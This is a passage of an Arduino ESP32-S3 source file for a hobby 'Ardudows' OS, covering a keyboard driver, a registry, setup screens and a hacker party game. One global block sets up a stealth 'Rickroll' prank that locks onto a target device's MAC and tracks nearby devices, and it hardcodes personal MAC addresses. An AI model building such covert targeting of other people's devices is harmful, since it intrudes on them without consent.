//이거 짜다가 새해가 밝아버림... 2025년에 시작해서 2026년 됨
//아 이걸 시작하면 안됬는데
//피곤하다 * 99999999
//챗지피티가 짠게 더 많은거 같아 ㅠㅠㅠ
//에라 모르겄다
//잘거야
//잤다
//주석 장난질이 가장 재밌어
//이거 개발하다 48일만에 앓아 누웠는데 맞냐
//48일에 SD인식 시킴 SPI충돌 고침 ㅋㅋㅋ
//49일차 PS/2 키보드 성공!!!
//50일차 지피티가 기억을 잃었다 ㅠㅠㅠ
//오늘도 즐겁ㄷ
//59일차 대혁명의 일이다
//무려 마인크래프트 릴리스 1.8.8 서버와 엄청난 명령어 모음!
//99일차 라우터 개발 시작
//137일차 시리얼 속도를 2M에서 115200으로 수정
//142일차 모니터 앞을 벗어나서 학교에서 운동회를 했다.
//142일차의 운동회는 (중)1학년 1등이라는 성과를 거뒀다.

//===겁나 쉬운 라이브러리 불러오기===
//이때가 젤 좋았었음...
//주석 제외 33개의 라이브러리
#include <string.h>
#include <TFT_eSPI.h>
#include <SPI.h>
#include <FS.h>
#include <SD.h>
#include <esp_system.h>
//#include <XPT2046_Touchscreen.h>
#include <WiFi.h>
//#include "Fonts/ASCFont.h"
//#include "Fonts/KSFont.h"
#include <Preferences.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <HTTPClient.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEClient.h>
#include <BLEAdvertisedDevice.h>
#include "esp_wifi.h"
#include <esp_netif.h>
#include "type.h"
#include <WiFiClientSecure.h>
#include "router.h"
#include <Update.h>
#include <esp_ota_ops.h>
#include <SocketIoClient.h>
#include <TJpg_Decoder.h>
//#include <TinyUSB.h>
#include "tusb.h"
#include <math.h>
//#include <RTClib.h>
#include <ESPAsyncWebServer.h>
#include <freertos/semphr.h>
#include <AsyncTCP.h>
#include "usb/usb_host.h" 
#include "esp_intr_alloc.h"
#include "esp_log.h"
//#include "USBHIDKeyboard.h"
//#include "USBHIDMouse.h"
//#include <EspUsbHost.h>
#include "esp_efuse.h"
#include "esp_task_wdt.h"
#include "soc/rtc_cntl_reg.h"
#include "soc/soc.h"
#include "esp_partition.h"
#include "esp_mac.h"
#include "soc/soc.h"
#include "esp_private/periph_ctrl.h"
#include "esp_netif.h"
#include "esp_wifi.h"

//===대입문(?)과 변수등 일단 뭐 아무거나 선언===

// 🔄 전역 변수 또는 setup 위쪽에 박아둘 카운터 변수들 (함수 리셋용)
int currentLineCount = 0;
int maxLines = 36;            // 🔥 [형님 튜닝 포인트] 화면 세로 최대 안전 줄 수
int maxCharsPerLine = 26;     // 🔥 [형님 튜닝 포인트] 화면 가로 최대 안전 글자 수
uint32_t totalInspectedFiles = 0;

struct AliasStructure {
  String shortCut; // "c"
  String realCmd;  // "cls"
};
AliasStructure myAliases[15]; // 최대 10개까지 동적 등록 허용
int aliasCount = 0;

// Ardudows OS 규격 앱 컨테이너 및 서버 인스턴스 구조체
struct WebServerConfig {
    int port;            // 32비트 입력 후 16비트(1~65535) 오버플로우 검증 예정
    bool isSecure;       // SSL 가속 레이어 여부
    String basePath;     // 컨테이너 루트 경로 (예: /Ardudows/System/Network/HTTP/8080/)
    bool isActive;       // 슬롯 가동 플래그
};

// 최대 4개의 독립 멀티서버 가상 슬롯 제공 (S3 대용량 PSRAM 뱅크 활용)
WebServerConfig http_slots[4] = {
    {80, false, "/Ardudows/System/Network/HTTP/80/", false},
    {8080, false, "/Ardudows/System/Network/HTTP/8080/", false},
    {443, true, "/Ardudows/System/Network/HTTP/443/", false},
    {8443, true, "/Ardudows/System/Network/HTTP/8443/", false}
};

AsyncWebServer* active_servers[4] = {NULL, NULL, NULL, NULL};

// 221서버 보호구역 절대 좌표 매크로
const int PROTECTED_ISLAND_X = 221;
const int PROTECTED_ISLAND_Y = 221;
//EspUsbHost usb;

// 상태 관리
bool usb_h_ready = false;
bool usb_d_ready = false;
uint8_t connected_count = 0;
uint8_t vbus_pin = 1; // VBUS 센싱 핀 (S3 GPIO 1)
uint8_t pwr_pin = 5;  // OTG 전원 제어 핀 (S3 GPIO 5)
// [전역 변수 구역]
String clipPath = "";   // 복사/잘라내기한 원본 경로
bool clipIsCut = false; // 잘라내기 모드 여부
#define KEY_ESC 0x76 // PS/2 Set 2 Raw Scan Code
AsyncWebSocket ws("/ws");    // 실시간 웹소켓 통로
// [수정] 번호표 기계(Mutex) 핸들을 선언합니다.
SemaphoreHandle_t sdMutex; 
portMUX_TYPE sdMux = portMUX_INITIALIZER_UNLOCKED;
// =========================
// PERF TESTER CORE
// =========================

enum PerfMode {
  MODE_FPS,
  MODE_CPU,
  MODE_FPU,
  MODE_SCREEN,
  MODE_FRAME,
  MODE_SRAM,
  MODE_PSRAM,
  MODE_SD,
  MODE_VECTOR,
  MODE_FULL,
  MODE_TINY
};
AsyncWebServer server(81);
// --- [ 1. 핀 번호 설정 ] ---
//int my_rtc_rst = 15; 
//int my_rtc_clk = 4;  
//int my_rtc_dat = 5;

// --- [ 2. 에러 방지용 전역 배열 선언 ] ---
// 함수 밖으로 빼서 컴파일러의 시비를 원천 봉쇄합니다 ㅋㅋㅋㅋ
uint8_t final_rtc_data_221; 
char final_time_str_221;
#define SPK 12
// ==========================================
// 인류 수학의 코어: 복소수 구조체 및 엔진
// ==========================================
struct Complex {
    double r, i;
};
// 파일 맨 상단 #include 아래에 추가
// --- VNC & Input Global Variables ---
//bool mouse_moved = false;
//int curX = 0, curY = 0;
//uint8_t btnState = 0;
//WiFiClient vncClient;
// VNC 서버의 픽셀 포맷 정보를 저장할 변수
//uint16_t vnc_sw, vnc_sh; 
bool usb_connected = false;
bool usb_ready = false;
SocketIoClient socket;
bool isNaMyHeeRunning = false;
#define GAME_BUZZER_PIN 10
#define GAME_MAX_PLAYERS 14

// ===== Game Internal Enums & Structs =====
enum GameRole { 
  ROLE_HACKER, ROLE_USER, ROLE_INTERNET_DEV, ROLE_FIREWALL_DEV, ROLE_DOCTOR, ROLE_GUARD, 
  ROLE_INVESTIGATOR, ROLE_CAMERAMAN, ROLE_JOURNALIST, ROLE_COMMUNICATOR, ROLE_IOT, ROLE_DISPLAY, ROLE_COMPONENT, ROLE_CORRUPTED 
};

// OS 기반 구동을 위한 앱 스테이트
enum GameAppStage { 
  APP_INIT_NODES, APP_INIT_NAMES, APP_STAGE_PASS, APP_STAGE_AUTH_TARGET, APP_STAGE_AUTH_LOG, APP_STAGE_RESULT 
};

struct GamePlayer {
  String name;
  GameRole role;
  bool alive = true;
  int target = -1;
  String stringInput = ""; 
  bool isProtected = false;
  bool isAlertHell = false;
  int delayMultiplier = 1; 
};

// ===== Game Global Variables =====
GamePlayer g_players[GAME_MAX_PLAYERS];
int g_totalPlayers = 3;
int g_currentPlayerIdx = 0;
int g_firewallCount = 5;
String g_nightLogs[40];
int g_logCount = 0;

GameAppStage g_appStage = APP_INIT_NODES;
bool g_isHackerRunning = false; // 앱 실행 상태 플래그
int g_setupNameIdx = 0;
GameRole rolePool[GAME_MAX_PLAYERS]; // 롤풀 전역 선언

// ino 파일 맨 윗부분 (setup 위)
//extern "C" {
//#include "vga.h"
//}

// 이게 핵심입니다! vga.c에 선언된 vga_state 포인터를 가져옵니다.
//extern VGAState* vga_state;
//#ifdef __cplusplus
//extern "C" {
//#endif

//#include "i386.h"
//#include "vga.h"
//#include "ide.h"
//#include "u8250.h"
//#include "cmos.h"
//#include "pc.h"

  // [성불의 핵심] pc.c에 정의된 pc_run의 존재를 C++에게 알림
  //void pc_run(int cycles);

  // global_pc 객체도 공유
  //extern PC* global_pc;
  //extern CPUI386* GLOBAL_CPU_PTR;

//#ifdef __cplusplus
//}
//#endif
// --- [공연 사령부 전역 변수 선언] ---
bool isRickrollActive = false;  // 공연이 진행 중인가?
bool isStealthMode = false;     // 은폐 모드

String myPhoneMAC = "0C:32:3A:EB:E3:3D";   // 사령관님(방장님) 폰
String myLaptopMAC = "50-76-AF-15-78-4A";  // 테스트용 PC (리허설 타겟)
String targetMAC = "";                     // 현재 락온된 숙적의 MAC

// 최대 10명까지 관객 추적
struct Audience {
  String mac;
  String name;
  bool isLocked = false;
};

Audience audienceList[10];
int audienceCount = 0;

struct BLEDeviceInfo {
  String addr;
  String name;
  int rssi;
  String uuid;
};

BLEDeviceInfo bleDevices[20];
int bleDeviceCount = 0;
int bleConnectedIndex = -1;
unsigned long bootTime = 0;
String bleConnectedAddr = "";
BLEClient* pBLEClient = nullptr;
BLEScan* pBLEScan = nullptr;
BLEScan* bleScan;
BLEClient* bleClient;
BLEAddress* bleTarget = nullptr;

bool bleInitialized = false;
bool bleConnected = false;
#define BUILTIN_LED 48  // ESP32-S3 내장 RGB LED (일반적으로 GPIO 48)
DNSServer dnsServer;
WebServer webServer(80);

bool rickrollRunning = false;
IPAddress apIP(192, 168, 4, 1);
String ROOT_PATH = "/Ardudows";
String currentPath = ROOT_PATH;
Preferences prefs;  // 영구 저장을 위한 객체
String atkInput = "";
String Boot_Kernel = "ATK";
bool Boot_Logo = true;
bool Boot_AutoLogin = false;
bool Boot_SafeMode = false;
String Boot_LastUser = "Administrator";
int Boot_Count = 0;
volatile uint8_t lastKey = 0;
uint8_t keyBuffer = 0;
bool keyAvailable = false;
// ======================
// 한글 폰트 버퍼
// ======================
byte HANFontImage[32];
bool auic = false;
// Language
const char* languageList[] = {
  "English"
};
int languageCount = 1;
int languageIndex = 0;

// Country
const char* countryList[] = {
  "U.S",
  "U.K",
  "India",
  "Russia",
  "North_Korea",
  "South_Korea",
  "Germany",
  "Italy",
  "China",
  "Japen",
  "Viet_nam",
  "Custom"
};
int countryCount = 12;
int countryIndex = 0;
#define UI_BG TFT_WHITE
#define UI_HEADER TFT_BLUE
#define UI_HEADER_TX TFT_WHITE
#define UI_TEXT TFT_BLACK
#define UI_BOX TFT_LIGHTGREY
#define UI_BOX_BORDER TFT_DARKGREY
#define UI_FOOTER TFT_NAVY
enum AUIC_STEP {
  AUIC_WELCOME,
  AUIC_LANGUAGE,
  AUIC_USERNAME,
  AUIC_COUNTRY,
  AUIC_AUTHORITY,
  AUIC_PASSWORD,
  AUIC_WORKGROUP,
  AUIC_COMPUTER,
  AUIC_SUMMARY,
  AUIC_DONE,

  AUIC_COUNT
};

AUIC_STEP auicStep = AUIC_WELCOME;
bool auicFinished = false;
bool auicEditing = false;
String auicEditBuffer = "";
String auicInputBuffer = "";
// =====================
// 키보드 상태
// =====================
bool shiftPressed = false;
bool isReleased = false;
bool isExtended = false;

// =====================
// AUIC 설정
// =====================
int auicCursor = -3;
bool auicDrawn = false;
bool startMenuOpen = false;

String auicLang = "English (U.S)";
String auicCountry = "U.S";
String auicAuthority = "Administrator";
String auicWorkgroup = "WORKGROUP";
String auicComputerName = "ARDUDOWS";

//int auicStep = 0;   // 0 = username, 1 = password
String auicUsername = "";
String auicPassword = "";

enum AUIC_STAGE {
  AUIC_MENU,
  AUIC_USERNAME_INPUT
};

AUIC_STAGE auicStage = AUIC_MENU;
int menuCount = 3;

// =====================
// 계정 관련
// =====================
String newUsername = "";
String newPassword = "";
String newWorkgroup = "";
String newAccountType = "";

String loginUser = "";
String loginPassword = "";
String loginInput = "";
String correctUser = "";
String currentUser = "";
bool keyboardEnterPressed = false;

bool loginDrawn = false;
bool loginUserEntered = false;
bool screenDrawn = false;

// 경로 (주의: currentUser 세팅 후 재설정 필요)
//String currentPath = "/Ardudows/Users/";
//bool auicDrawn = false;
//int menuIndex = 0;

String menuItems[] = {
  "Set Username",
  "Continue",
  "Exit"
};
enum INSTALL_STAGE {
  INST_WELCOME,
  INST_LICENSE,
  INST_COPYING,
  INST_DONE
};

INSTALL_STAGE installStage = INST_WELCOME;
bool installDrawn = false;
int linesPerScreen = 20;
#define MAX_LINES 100

String screenBuffer[MAX_LINES];
int totalLines = 0;
int scrollOffset = 0;

int menuIndex = 0;
//const int menuCount = 4;   // 메뉴 개수
String auicInput = "";
bool atkStarted = false;
#define CLK_PIN 18
#define DATA_PIN 17
volatile int bitCount = 0;
volatile uint8_t incomingData = 0;
volatile uint32_t lastClockTime = 0;

// 기본 키맵 (소문자)
const char keymap[] = {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '`', 0,
  0, 0, 0, 0, 0, 'q', '1', 0, 0, 0, 'z', 's', 'a', 'w', '2', 0,
  0, 'c', 'x', 'd', 'e', '4', '3', 0, 0, ' ', 'v', 'f', 't', 'r', '5', 0,
  0, 'n', 'b', 'h', 'g', 'y', '6', 0, 0, 0, 'm', 'j', 'u', '7', '8', 0,
  0, ',', 'k', 'i', 'o', '0', '9', 0, 0, '.', '/', 'l', ';', 'p', '-', 0,
  0, 0, '\'', 0, '[', '=', 0, 0, 0, 0, '\n', ']', 0, '\\', 0, 0
};

// Shift 눌렀을 때의 키맵
const char shift_keymap[] = {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '~', 0,
  0, 0, 0, 0, 0, 'Q', '!', 0, 0, 0, 'Z', 'S', 'A', 'W', '@', 0,
  0, 'C', 'X', 'D', 'E', '$', '#', 0, 0, ' ', 'V', 'F', 'T', 'R', '%', 0,
  0, 'N', 'B', 'H', 'G', 'Y', '^', 0, 0, 0, 'M', 'J', 'U', '&', '*', 0,
  0, '<', 'K', 'I', 'O', ')', '(', 0, 0, '>', '?', 'L', ':', 'P', '_', 0,
  0, 0, '\"', 0, '{', '+', 0, 0, 0, 0, '\n', '}', 0, '|', 0, 0
};

// =====================
// Ardudows Key Codes
// =====================
#define KEY_NONE 0x00

#define KEY_ENTER 0x0D
#define KEY_BACKSPACE 0x08

#define KEY_F1 0x81
#define KEY_F2 0x82
#define KEY_F3 0x83
#define KEY_F4 0x84
#define KEY_F5 0x85
#define KEY_F6 0x86
#define KEY_F7 0x87
#define KEY_F8 0x88
#define KEY_F9 0x89
#define KEY_F10 0x8A
#define KEY_F11 0x8B
#define KEY_F12 0x8C

#define KEY_UP 0x90
#define KEY_DOWN 0x91
#define KEY_LEFT 0x92
#define KEY_RIGHT 0x93

String inputBuffer = "";

enum SPI_Device {
  SPI_NONE,
  SPI_TFT,
  SPI_SD,
};
static SPI_Device currentSPI = SPI_NONE;
static bool spi_busy = false;
#define REG_MAX_SECTION 16
#define REG_MAX_KEY 32
#define REG_MAX_VALUE 64
#define REG_MAX_ITEMS 32
//XPT2046_Touchscreen ts(TOUCH_CS, TOUCH_IRQ);
typedef struct {
  char key[REG_MAX_KEY];
  char value[REG_MAX_VALUE];
} RegistryKey;

typedef struct {
  char section[REG_MAX_SECTION];
  RegistryKey keys[REG_MAX_ITEMS];
  int key_count;
} RegistryItem;
int BootCount;
String WelcomeText = "hello";
//String이 좋았는데...
//bool SafeMode = false;
//SafeMode만들기
bool recoveryMode = false;
//SafeMode 대용
int ver = 1;
//버전
String Firmware = "BIOS";
//응 펌웨어는 귀찮으니깐 걍 이케 간지나게만 해봄
TFT_eSPI tft = TFT_eSPI();
String install_path = "/Ardudows/System/install.aif";
//설치 체크하는 파일 위치
String UserName = "Administrator";
bool SD_OK = false;
bool install = false;
bool NetWork = false;
//bool AUIC;
bool EULA = false;
String AEC = "TEST";
SPIClass spiSD(FSPI);
const char KEYSET[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
char PRODUCT_KEY[30];
//문자 25개에 하이픈(-)까지 30개
#define Recovery_ProductKey "12345-67890-12345-67890";
//#define ATT_TimeOut 5000 //5초인가
/*
bool TouchDetected() {
  return digitalRead(TOUCH_IRQ) == LOW;
}
*/
static RegistryItem registry[REG_MAX_ITEMS];
static int registry_count = 0;

static RegistryItem* current_item = NULL;
static RegistryKey* current_key = NULL;

static bool registry_dirty = false;

//===PS2키보드 관련 함수===
void IRAM_ATTR host_isr() {
  uint32_t now = micros();
  if (now - lastClockTime < 50) return;
  // 200,000(0.2초) -> 500,000(0.5초) 정도로 완화
  if (now - lastClockTime > 200000) {
    bitCount = 0;
    incomingData = 0;
  }
  int val = digitalRead(DATA_PIN);
  if (bitCount > 0 && bitCount < 9) {
    incomingData >>= 1;
    if (val) incomingData |= 0x80;
  }
  bitCount++;
  lastClockTime = now;
}

void Keyboard_Update() {
  if (lastKey != 0) {
    keyBuffer = lastKey;
    keyAvailable = true;
    lastKey = 0;
  }
}

//===부팅관련 에넘===
enum BootState {
  BOOT_RECOVERY,
  BOOT_INSTALL,
  BOOT_AUIC,
  BOOT_KERNEL,
  BOOT_LOGIN
};

BootState bootState;

//===ps2키보드 드라이버===
uint8_t ps2Keyboard_adf() {
  uint8_t code;

  // ===== ISR 보호 =====
  noInterrupts();

  if (bitCount < 11) {
    interrupts();
    return KEY_NONE;
  }

  code = incomingData;

  bitCount = 0;
  incomingData = 0;

  interrupts();
  // ====================


  // Break code
  if (code == 0xF0) {
    isReleased = true;
    return KEY_NONE;
  }


  // Extended code
  if (code == 0xE0) {
    isExtended = true;
    return KEY_NONE;
  }


  // Shift
  if (code == 0x12 || code == 0x59) {
    shiftPressed = !isReleased;
    isReleased = false;
    return KEY_NONE;
  }


  // Release ignore
  if (isReleased) {
    isReleased = false;
    isExtended = false;
    return KEY_NONE;
  }


  // Extended keys
  if (isExtended) {
    isExtended = false;

    switch (code) {
      case 0x75: return KEY_UP;
      case 0x72: return KEY_DOWN;
      case 0x6B: return KEY_LEFT;
      case 0x74: return KEY_RIGHT;
    }

    return KEY_NONE;
  }


  // Function keys
  switch (code) {
    case 0x05: return KEY_F1;
    case 0x06: return KEY_F2;
    case 0x04: return KEY_F3;
    case 0x0C: return KEY_F4;
    case 0x03: return KEY_F5;
    case 0x0B: return KEY_F6;
    case 0x83: return KEY_F7;
    case 0x0A: return KEY_F8;
    case 0x01: return KEY_F9;
    case 0x09: return KEY_F10;
    case 0x78: return KEY_F11;
    case 0x07: return KEY_F12;
  }


  // Enter
  if (code == 0x5A)
    return KEY_ENTER;


  // Backspace
  if (code == 0x66)
    return KEY_BACKSPACE;


  // Character
  if (code < 128) {
    char c = shiftPressed ? shift_keymap[code] : keymap[code];

    if (c != 0) {
      return c;
    }
  }

  return KEY_NONE;
}
/*
// =================================================
// 한글 조합 함수 (네가 만든 그대로, 수정 없음)
// =================================================
byte* getHAN_font(byte HAN1, byte HAN2, byte HAN3) {

  const byte cho[] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 3, 3, 3, 1, 2, 4, 4, 4, 2, 1, 3, 0 };
  const byte cho2[] = { 0, 5, 5, 5, 5, 5, 5, 5, 5, 6, 7, 7, 7, 6, 6, 7, 7, 7, 6, 6, 7, 5 };
  const byte jong[] = { 0, 0, 2, 0, 2, 1, 2, 1, 2, 3, 0, 2, 1, 3, 3, 1, 2, 1, 3, 3, 1, 1 };

  uint16_t utf16;
  byte first, mid, last;
  byte firstType, midType, lastType;
  byte *pB, *pF;

  utf16 = (HAN1 & 0x0F) << 12 | (HAN2 & 0x3F) << 6 | (HAN3 & 0x3F);
  utf16 -= 0xAC00;

  last = utf16 % 28;
  utf16 /= 28;
  mid = utf16 % 21;
  first = utf16 / 21;

  first++;
  mid++;

  if (!last) {
    firstType = cho[mid];
    midType = (first == 1 || first == 24) ? 0 : 1;
  } else {
    firstType = cho2[mid];
    midType = (first == 1 || first == 24) ? 2 : 3;
    lastType = jong[mid];
  }

  memset(HANFontImage, 0, 32);

  pB = HANFontImage;
  pF = (byte*)KSFont + (firstType * 20 + first) * 32;
  for (int i = 0; i < 32; i++) *pB++ = pgm_read_byte(pF++);

  pB = HANFontImage;
  pF = (byte*)KSFont + (8 * 20 + midType * 22 + mid) * 32;
  for (int i = 0; i < 32; i++) *pB++ |= pgm_read_byte(pF++);

  if (last) {
    pB = HANFontImage;
    pF = (byte*)KSFont + (8 * 20 + 4 * 22 + lastType * 28 + last) * 32;
    for (int i = 0; i < 32; i++) *pB++ |= pgm_read_byte(pF++);
  }

  return HANFontImage;
}

// =================================================
// 한글 출력 함수
// =================================================
void matrixPrint(int x, int y, const char* str) {
  while (*str) {
    byte c = *str++;

    if (c == '\n') {
      x = 0;
      y += 16;
    } else if (c >= 0x80) {
      byte c2 = *str++;
      byte c3 = *str++;
      byte* bmp = getHAN_font(c, c2, c3);
      tft.drawBitmap(x, y, bmp, 16, 16, TFT_WHITE);
      x += 16;
    } else {
      byte* bmp = (byte*)ASCfontSet + (c - 0x20) * 16;
      tft.drawBitmap(x, y, bmp, 8, 16, TFT_WHITE);
      x += 8;
    }

    if (x > 320 - 16) {
      x = 0;
      y += 16;
    }
  }
}
*/
//===레지스트리 기능들===
//기본
void Registry_Init(void) {
  registry_count = 0;
  current_item = NULL;
  current_key = NULL;
  registry_dirty = false;
}

bool Registry_Load(void) {
  // TODO: Flash / SD에서 로드
  // 지금은 성공했다고 가정
  return true;
}

//===섹션관련(item)===
bool Registry_Make_Item(const char* section) {
  if (registry_count >= REG_MAX_ITEMS) return false;

  for (int i = 0; i < registry_count; i++) {
    if (strcmp(registry[i].section, section) == 0)
      return true;  // 이미 있음
  }

  strcpy(registry[registry_count].section, section);
  registry[registry_count].key_count = 0;
  registry_count++;
  registry_dirty = true;
  return true;
}

bool Registry_Select_Item(const char* section) {
  for (int i = 0; i < registry_count; i++) {
    if (strcmp(registry[i].section, section) == 0) {
      current_item = &registry[i];
      current_key = NULL;
      return true;
    }
  }
  return false;
}

bool Registry_Delete_Item(const char* section) {
  for (int i = 0; i < registry_count; i++) {
    if (strcmp(registry[i].section, section) == 0) {
      for (int j = i; j < registry_count - 1; j++)
        registry[j] = registry[j + 1];
      registry_count--;
      registry_dirty = true;
      return true;
    }
  }
  return false;
}


bool Registry_Save(void) {
  if (!registry_dirty) return true;

  // TODO: Flash / SD에 저장
  registry_dirty = false;
  return true;
}

//===키 관련===
bool Registry_Make_Key(const char* key) {
  if (!current_item) return false;
  if (current_item->key_count >= REG_MAX_ITEMS) return false;

  for (int i = 0; i < current_item->key_count; i++) {
    if (strcmp(current_item->keys[i].key, key) == 0)
      return true;
  }

  strcpy(current_item->keys[current_item->key_count].key, key);
  current_item->keys[current_item->key_count].value[0] = '\0';
  current_item->key_count++;
  registry_dirty = true;
  return true;
}

bool Registry_Select_Key(const char* key) {
  if (!current_item) return false;

  for (int i = 0; i < current_item->key_count; i++) {
    if (strcmp(current_item->keys[i].key, key) == 0) {
      current_key = &current_item->keys[i];
      return true;
    }
  }
  return false;
}

bool Registry_Delete_Key(const char* key) {
  if (!current_item) return false;

  for (int i = 0; i < current_item->key_count; i++) {
    if (strcmp(current_item->keys[i].key, key) == 0) {
      for (int j = i; j < current_item->key_count - 1; j++)
        current_item->keys[j] = current_item->keys[j + 1];
      current_item->key_count--;
      registry_dirty = true;
      return true;
    }
  }
  return false;
}

//===값 함수===
bool Registry_Set_Value(const char* value) {
  if (!current_key) return false;

  strcpy(current_key->value, value);
  registry_dirty = true;
  return true;
}

bool Registry_Clear_Value(void) {
  if (!current_key) return false;

  current_key->value[0] = '\0';
  registry_dirty = true;
  return true;
}

//===고급===
bool Registry_Set(const char* file, const char* key, const char* value) {
  String path = "/Ardudows/System/Registry/";
  path += file;
  path += ".asf";

  File f = SD.open(path.c_str(), FILE_APPEND);

  if (!f) return false;

  f.print(key);
  f.print("=");
  f.println(value);

  f.close();

  return true;
}

const char* Registry_Get(const char* section, const char* key) {
  for (int i = 0; i < registry_count; i++) {
    if (strcmp(registry[i].section, section) == 0) {
      for (int j = 0; j < registry[i].key_count; j++) {
        if (strcmp(registry[i].keys[j].key, key) == 0) {
          return registry[i].keys[j].value;
        }
      }
    }
  }
  return NULL;
}

bool Registry_Exists(const char* section, const char* key) {
  return Registry_Get(section, key) != NULL;
}

String Registry_Read_Value(const char* path, const char* key) {
  File f = SD.open(path);

  if (!f) return "";

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();

    int eq = line.indexOf('=');

    if (eq > 0) {
      String k = line.substring(0, eq);
      String v = line.substring(eq + 1);

      if (k == key) {
        f.close();
        return v;
      }
    }
  }

  f.close();
  return "";
}

//===확인===
/*
void Check() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.print("Touch to continue.");

  uint32_t startTime = millis();

  while (millis() - startTime < ATT_TimeOut) {
    if (TouchDetected()) {
      while (TouchDetected()) delay(5); // 디바운스
      Registry_Set_Touch(true);
      return;
    }
    delay(10);
  }

  Registry_Set_Touch(false); // 타임아웃
}
*/
//터치 넘 열받아서 지움



//===터치 레지스트리===
/*
void Registry_Set_Touch(bool value) {
  File f = SD.open("/Ardudows/System/Registry/Input.asf", FILE_WRITE);
  if (!f) return;

  f.println("[Input]");
  f.print("Touch=");
  f.println(value ? "true" : "false");
  f.close();
}
*/

//===설치 단계===
enum InstallStep {
  STEP_WELCOME,
  STEP_LICENSE,
  STEP_USER,
  STEP_INSTALLING,
  STEP_DONE
};

/*
//===ATT===
void ATT() {
  //Ardudows Touch Test(ATT)
  //아오 터치 진짜
  //야호 해방이다
  
  tft.println("Ardudows Touch Test");
  tft.println("-------------------");
  tft.println();
  tft.println("ATT start.");
  tft.println("Touch please.");
  tft.println();
  tft.println("[ Touch anywhere ]");

  unsigned long startTime = millis();

  while (millis() - startTime < ATT_TimeOut) {
    if (TouchDetected()) {
      Registry_Set_Touch(true);
      return; // ✅ 통과 → 바로 AUIC로
    }
    delay(10); // CPU 숨 좀 쉬자
  }

  // ⛔ 타임아웃 → 터치 없음
  Registry_Set_Touch(false);
  return;
}
*/

//===로딩 애니메이션===
char spinner[] = { 'l', '/', '-', '\\' };
int spinIndex = 0;

void Loading() {
  tft.print(".");
}

//===터치 레지스트리 겟===
/*
bool Registry_Get_Touch() {
  File f = SD.open("/Ardudows/System/Registry/Input.asf");
  if (!f) return false; // 파일 없으면 터치 없음 취급

  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.startsWith("Touch=")) {
      f.close();
      return line.endsWith("true");
    }
  }

  f.close();
  return false;
}
*/

//===UI_MODE===
void Windows_like() {}
void Mac_like() {}
void Mad_UI() {}
void Simple() {}
void Anime() {}
void Industial() {}
void No_UI() {}
void OUC() {}  //Only User Custom이 OUC

//===APTC(Ardudows ProToCol)===
void sendAPTC(const char* key) {
  Serial1.println("S");
  Serial1.print("input_key_");
  Serial1.println(key);
  Serial1.println("E");
}

struct Key {
  int x, y, w, h;
  const char* value;
};

Key keys[] = {
  // Row 1
  { 0, 160, 32, 40, "q" },
  { 32, 160, 32, 40, "w" },
  { 64, 160, 32, 40, "e" },
  { 96, 160, 32, 40, "r" },
  { 128, 160, 32, 40, "t" },
  { 160, 160, 32, 40, "y" },
  { 192, 160, 32, 40, "u" },
  { 224, 160, 32, 40, "i" },
  { 256, 160, 32, 40, "o" },
  { 288, 160, 32, 40, "p" },

  // Row 2
  { 16, 200, 32, 40, "a" },
  { 48, 200, 32, 40, "s" },
  { 80, 200, 32, 40, "d" },
  { 112, 200, 32, 40, "f" },
  { 144, 200, 32, 40, "g" },
  { 176, 200, 32, 40, "h" },
  { 208, 200, 32, 40, "j" },
  { 240, 200, 32, 40, "k" },
  { 272, 200, 32, 40, "l" },

  // Row 3
  { 48, 240, 32, 40, "z" },
  { 80, 240, 32, 40, "x" },
  { 112, 240, 32, 40, "c" },
  { 144, 240, 32, 40, "v" },
  { 176, 240, 32, 40, "b" },
  { 208, 240, 32, 40, "n" },
  { 240, 240, 32, 40, "m" },

  // Special
  { 0, 280, 80, 40, "back" },
  { 80, 280, 160, 40, "space" },
  { 240, 280, 80, 40, "enter" }
};

/*
void handleKeyboardTouch(int x, int y) {
  for (int i = 0; i < sizeof(keys)/sizeof(Key); i++) {
    Key k = keys[i];

    if (x >= k.x && x <= k.x + k.w &&
        y >= k.y && y <= k.y + k.h) {

      sendAPTC(k.value);
      delay(180); // 디바운스
      return;
    }
  }
}
*/
//터치 싫어

//===설치체크===
/*
void CheckInstall() {
  if (!SD.exists("/Ardudows/System/install.aif")) return;

  File f = SD.open("/Ardudows/System/install.aif", FILE_READ);
  while (f.available()) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line == "install=true") {
      install = true;
      break;
    }
  }
  f.close();
}
*/

//===RecoveryMode===
void RecoveryMode() {
  tft.fillScreen(TFT_GREEN);
  tft.setCursor(0, 0);
  tft.setTextSize(2);
  tft.setTextColor(TFT_BLACK, TFT_GREEN);
  tft.print("RecoveryMode");
  tft.println("Menu : ");
  tft.setTextSize(1);
  tft.print(R"(
  1. Check your SD.
  2. Reupload code.
  3. SD insert other PC and File recovery pleas.
  4. Firmwarm check.
  5. Reboot
  )");
  delay(300);
}

//===ASRaS(Ardudows System Recovery and Set)===
//이 파트는 다 지피티가 해줌

void ASRaS_Core() {

  pinMode(TFT_CS, OUTPUT);
  pinMode(SD_CS, OUTPUT);
  //pinMode(TOUCH_CS, OUTPUT);

  // 전원 켜자마자 전부 격리
  digitalWrite(TFT_CS, HIGH);
  digitalWrite(SD_CS, HIGH);
  //digitalWrite(TOUCH_CS, HIGH);

  //pinMode(TOUCH_IRQ, INPUT_PULLUP);

  delay(10);  // ESP32-S3 안정화
}

bool ASRaS_DeviceInit() {

  //=====================================
  // 1. TFT 초기화 (기본 SPI)
  //=====================================
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);  // TFT 살아있으면 여기 보임
  delay(50);

  //=====================================
  // 2. SD용 SPI 초기화
  //=====================================
  spiSD.begin(SD_SCLK, SD_MISO, SD_MOSI, SD_CS);
  delay(100);  // SD 카드 안정화 시간 (중요)

  //=====================================
  // 3. SD 마운트
  // ⚠️ 이 줄은 절대 빼면 안 됨
  //=====================================
  bool ok = SD.begin(SD_CS, spiSD);
  delay(50);

  //=====================================
  // 4. 결과 표시
  //=====================================
  /*
  if (SD_OK) {
